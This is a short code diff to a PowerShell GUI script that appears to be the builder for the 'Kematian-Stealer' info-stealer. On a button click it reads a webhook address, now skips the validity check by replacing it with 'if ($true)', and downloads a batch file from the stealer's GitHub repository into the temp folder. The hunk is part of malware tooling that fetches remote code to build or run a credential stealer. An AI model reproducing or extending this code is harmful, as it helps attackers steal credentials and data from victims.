@@ -62,7 +62,7 @@ $form.Controls.Add($button)
 # Define the button click event
 $button.Add_Click({
     $webhook = $textbox.Text
-    if (CheckValid -webhook $webhook) {
+    if ($true) {
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
         $filePathprotect = ".\main.bat"
